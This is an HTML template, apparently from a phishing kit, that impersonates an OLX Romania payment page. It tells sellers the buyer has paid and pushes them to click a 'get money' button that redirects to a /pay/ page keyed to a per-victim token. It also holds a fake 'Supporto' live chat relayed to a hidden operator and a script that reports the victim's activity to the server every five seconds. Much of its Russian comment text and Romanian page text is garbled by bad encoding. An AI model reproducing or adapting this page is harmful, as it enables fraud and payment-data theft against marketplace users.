<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OLX Payment Page</title>
    <style>
        /* styles.css */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
    color: #333;
    line-height: 1.5;
    padding: 20px;
}

.container {
    max-width: 600px;
    margin: 0 auto;
    background: #fff;
    border: 1px solid #ddd;
    border-radius: 8px;
    overflow: hidden;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.header {
    background-color: #005f59;
    color: #fff;
    text-align: center;
    padding: 10px;
    font-size: 1.5rem;
    font-weight: bold;
}

.main-content {
    padding: 20px;
}

.status {
    background-color: #e9f7ef;
    padding: 15px;
    border-radius: 5px;
    margin-bottom: 20px;
    text-align: center;
    color: #2c662d;
}

.product-info h1 {
    font-size: 1.2rem;
    margin-bottom: 10px;
    font-weight: normal;
}

.price {
    font-size: 1.5rem;
    color: #005f59;
    font-weight: bold;
}

.form-section {
    margin: 20px 0;
}

.form-group {
    margin-bottom: 15px;
}

.form-group label {
    display: block;
    font-weight: bold;
    margin-bottom: 5px;
}

.form-group input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
    background-color: #f9f9f9;
    color: #666;
}

.delivery-options .option {
    display: flex;
    align-items: center;
    margin-bottom: 10px;
}

.delivery-options input {
    margin-right: 10px;
}

.delivery-options label {
    font-weight: bold;
}

.delivery-options span {
    display: block;
    font-size: 0.85rem;
    color: #666;
}

.summary {
    text-align: center;
    margin-top: 20px;
}

.cta-button {
    background-color: #005f59;
    color: #fff;
    border: none;
    padding: 15px 20px;
    border-radius: 5px;
    font-size: 1rem;
    cursor: pointer;
    width: 100%;
}

.cta-button:hover {
    background-color: #004e4a;
}

.secure-text {
    margin-top: 15px;
    font-size: 0.85rem;
    color: #888;
}

.image_url {
    margin: 0px 100px;
    max-height: 350px;
    max-width: 350px;
    border-radius: 20px;
}










/* —á–∞—Ç */
/* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ */
#chat-button {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 50px;
        width: 60px;
        height: 60px;
        font-size: 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        z-index: 1001;
    }
    
    #chat-container {
        position: fixed;
        bottom: 80px;
        right: 20px;
        width: 280px;
        max-height: 500px;
        min-height: 400px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
        display: none; /* –ß–∞—Ç —Å–∫—Ä—ã—Ç –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é */
        flex-direction: column;
        overflow: hidden;
        z-index: 1000;
    }
    
    #chat-container.active {
        display: flex; /* –ü–æ–∫–∞–∑–∞—Ç—å —á–∞—Ç –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ */
    }
    
    #chat-header {
        display: flex;
        align-items: center;
        background-color: #000;
        color: #fff;
        padding: 10px;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
    }
    
    .chat-avatar img {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin-right: 10px;
    }
    
    .chat-info h3 {
        margin: 0;
        font-size: 16px;
    }
    
    .chat-info p {
        margin: 0;
        font-size: 12px;
        opacity: 0.7;
    }
    
    #close-chat {
        background: none;
        border: none;
        color: #fff;
        font-size: 18px;
        margin-left: auto;
        cursor: pointer;
    }
    
    #chat-messages {
        flex: 1;
        padding: 10px;
        background-color: #f9f9f9;
        overflow-y: auto;
    }
    
    .chat-message {
        margin: 5px 0;
        display: flex;
        align-items: flex-start;
    }
    
    .chat-message.user {
        justify-content: flex-end;
    }
    
    .chat-bubble {
        max-width: 70%;
        padding: 10px;
        border-radius: 10px;
        font-size: 14px;
        line-height: 1.4;
    }
    
    .chat-message.user .chat-bubble {
        background-color: #000;
        color: #fff;
        border-bottom-right-radius: 0;
    }
    
    .chat-message.bot .chat-bubble {
        background-color: #e0e0e0;
        color: #000;
        border-bottom-left-radius: 0;
    }
    
    #chat-input {
        display: flex;
        padding: 10px;
        background-color: #fff;
        border-top: 1px solid #ddd;
    }
    
    #message-input {
        flex: 1;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 20px;
        outline: none;
        font-size: 14px;
    }
    
    #send-button {
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        margin-left: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
    }

    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo">OLX</div>
        </header>
        <main class="main-content">
            <div class="status">
                <p><strong>CumpƒÉrƒÉtorul a plƒÉtit pentru produs</strong></p>
                <p>A»ôtepta»õi ca v√¢nzƒÉtorul sƒÉ primeascƒÉ banii</p>
            </div>
            <div class="product-info">
                    <img src="{{image_url}}" alt="photo" class="image_url">
                <h1>{{product_name}}</h1>
                <p class="price">{{price}}</p>
            </div>
            <div class="form-section">
                <div class="form-group">
                    <label for="name">Nume & Nume de familie</label>
                    <input type="text" id="name" value="{{name}}" readonly>
                </div>
                <div class="form-group">
                    <label for="address">AdresƒÉ de livrare</label>
                    <input type="text" id="address" value="{{address}}" readonly>
                </div>
                <div class="delivery-options">
                    <div class="option">
                        <input type="radio" id="olx-courier" name="delivery" checked>
                        <label for="olx-courier">OLX Courier<br><span>Livrarea prin curier este posibilƒÉ</span></label>
                    </div>
                    <div class="option">
                        <input type="radio" id="fan-courier" name="delivery">
                        <label for="fan-courier">Fan Courier<br><span>Livrarea prin curier este posibilƒÉ</span></label>
                    </div>
                    <div class="option">
                        <input type="radio" id="posta-romana" name="delivery">
                        <label for="posta-romana">Po»ôta Rom√¢nƒÉ<br><span>Livrarea prin curier este posibilƒÉ</span></label>
                    </div>
                </div>
            </div>
            <div class="summary">
                <p><strong>A merge la primirea de fonduri</strong></p>
                <p>La primire: <span class="price">{{price}}</span></p>

                <button id="Ricevi" class="cta-button">Ob»õine»õi bani</button>
                
                <script>
                    // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ –∫ –∫–Ω–æ–ø–∫–µ —Å ID "Ricevi"
                    document.querySelector("#Ricevi").addEventListener("click", function() {
                        // –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ URL
                        const currentUrl = window.location.href;
                
                        // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —á–∞—Å—Ç–∏ URL –ø–æ—Å–ª–µ "/get/"
                        const extractedPart = currentUrl.split("/get/")[1];
                
                        // –ü—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å—Ç—å –ª–∏ –Ω—É–∂–Ω–∞—è —á–∞—Å—Ç—å –≤ URL
                        if (extractedPart) {
                            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ "/pay/" —Å –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º –∏–∑–≤–ª–µ—á–µ–Ω–Ω–æ–π —á–∞—Å—Ç–∏
                            window.location.href = "/pay/" + extractedPart;
                        } else {
                            alert("–û—à–∏–±–∫–∞: –≤ URL –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç —á–∞—Å—Ç—å –ø–æ—Å–ª–µ '/get/'.");
                        }
                    });
                </script>


                <p class="secure-text">
                    <small>
                        Efectuarea plƒÉ»õilor este sigurƒÉ<br>
                        D√¢nd clic pe butonul ‚ÄûMerge»õi la primire‚Äù, sunte»õi de acord cu √Æncheierea Acordului pentru v√¢nzarea de bunuri folosind serviciul online ‚ÄûTranzac»õie sigurƒÉ‚Äù.
                    </small>
                </p>
            </div>
        </main>
    </div>















            <!-- –ß–ê–¢ –ù–ê–ß -->
            <button id="chat-button">üí¨</button>
            <div id="chat-container">
                <div id="chat-header">
                    <div class="chat-avatar">
                        <img src="/media/operator-img.png" alt="Support">
                    </div>
                    <div class="chat-info">
                        <h3>Supporto</h3>
                        <p>Online</p>
                    </div>
                    <button id="close-chat">‚úñ</button>
                </div>
                <div id="chat-messages"></div>
                <div id="chat-input">
                    <input type="text" id="message-input" placeholder="Digitare un messaggio...">
                    <button id="send-button">‚û§</button>
                </div>
            </div>
                
            <script>
                const chatButton = document.getElementById('chat-button');
                const chatContainer = document.getElementById('chat-container');
                const closeChat = document.getElementById('close-chat');
                const sendButton = document.getElementById('send-button');
                const messageInput = document.getElementById('message-input');
                const chatMessages = document.getElementById('chat-messages');
                
                // –û—Ç–∫—Ä—ã—Ç–∏–µ/–∑–∞–∫—Ä—ã—Ç–∏–µ —á–∞—Ç–∞
                chatButton.addEventListener('click', () => {
                    chatContainer.classList.toggle('active');
                });
                
                closeChat.addEventListener('click', () => {
                    chatContainer.classList.remove('active');
                });
                
        
        
                // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞ –∏–∑ URL
                function getTokenFromURL() {
                    const url = window.location.pathname; // –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç—å –∏–∑ URL
                    const match = url.match(/\/get\/([^/]+)/); // –ò—â–µ–º —Ç–æ–∫–µ–Ω –ø–æ—Å–ª–µ /get/
                    return match ? match[1] : null; // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–æ–∫–µ–Ω –∏–ª–∏ null, –µ—Å–ª–∏ —Ç–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω
                }
        
        
        
        
                // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
                async function fetchAdminMessages(token) {
                    try {
                        const response = await fetch(`/get_admin_message_support/${token}/`, {
                            method: 'GET',
                            headers: {
                                'Content-Type': 'application/json'
                            }
                        });
        
                        if (response.ok) {
                            const data = await response.json();
                            const status = data.status
                            if (status=="success") {
                                const adminMessage = data.message || null;
                                if (adminMessage) {
                                    addMessage(adminMessage, 'bot'); // –î–æ–±–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
                                }
                            }
                        } else {
                            console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ —Å–æ–æ–±—â–µ–Ω–∏–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:', response.status);
                        }
                    } catch (error) {
                        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏:', error);
                    }
                }
                
                // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
                async function sendMessage() {
                    const userMessage = messageInput.value.trim();
                    const token = getTokenFromURL(); // –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –∏–∑ URL
        
                    if (userMessage && token) {
                        addMessage(userMessage, 'user'); // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        
                        // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
                        const payload = {
                            text: userMessage,
                            token: token
                        };
        
                        try {
                            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                            const response = await fetch(`/send_message_support/${token}/`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(payload)
                            });
        
                            if (response.ok) {
                                messagePollingInterval = setInterval(() => {
                                    fetchAdminMessages(token);
                                }, 2000);
        
        
        
                            } else {
                                addMessage('–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.', 'bot');
                            }
                        } catch (error) {
                            console.error('–û—à–∏–±–∫–∞:', error);
                            addMessage('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.', 'bot');
                        }
        
                        messageInput.value = ''; // –û—á–∏—â–∞–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞
                    } else if (!token) {
                        alert('–¢–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ URL!');
                    }
        }
        
                // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è
                function addMessage(text, sender) {
                    const messageElement = document.createElement('div');
                    messageElement.classList.add('chat-message', sender);
                    const bubble = document.createElement('div');
                    bubble.classList.add('chat-bubble');
                    bubble.textContent = text;
                    messageElement.appendChild(bubble);
                    chatMessages.appendChild(messageElement);
                    chatMessages.scrollTop = chatMessages.scrollHeight;
                }
        
                // –ü—Ä–∏–≤—è–∑–∫–∞ —Å–æ–±—ã—Ç–∏–π
                sendButton.addEventListener('click', sendMessage); // –û—Å—Ç–∞–≤–ª—è–µ–º –æ–¥–Ω—É –ø—Ä–∏–≤—è–∑–∫—É
                messageInput.addEventListener('keypress', (event) => {
                    if (event.key === 'Enter') {
                        sendMessage();
                    }
                });
        
        </script>
    
    
    
    
    
    
    <script>
        const currentUrl = window.location.href;
        const token = currentUrl.split("/get/")[1];
    
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Å–µ—Ä–≤–µ—Ä–∞
        async function notifyServer() {
        try {
            const response = await fetch(`/check_activity/${token}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
            });
            if (response.ok) {
            console.log("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–∫—Ç–∏–≤–µ–Ω");
            } else {
            console.log("–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏");
            }
        } catch (error) {
            console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∑–∞–ø—Ä–æ—Å–∞:", error);
        }
        }
    
        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
        setInterval(notifyServer, 5000); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
    </script>
            
        
            <!-- –ß–ê–¢ –ö–û–ù -->
</body>
</html>